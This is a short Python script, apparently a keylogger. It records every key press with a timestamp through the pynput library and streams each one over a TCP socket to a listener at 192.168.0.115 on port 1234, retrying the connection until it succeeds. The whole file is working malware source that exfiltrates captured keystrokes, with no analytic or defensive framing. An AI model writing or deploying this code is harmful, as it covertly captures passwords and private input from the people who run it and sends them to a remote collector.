from pynput.keyboard import Key, Listener
import datetime, os, socket
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.115', 1234))
        break
    except:
        pass
def on_press(key):
    contents = f'{datetime.datetime.today()}: {key}\n'.encode()
    s.send(contents.strip())
def on_release(key):
    pass
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
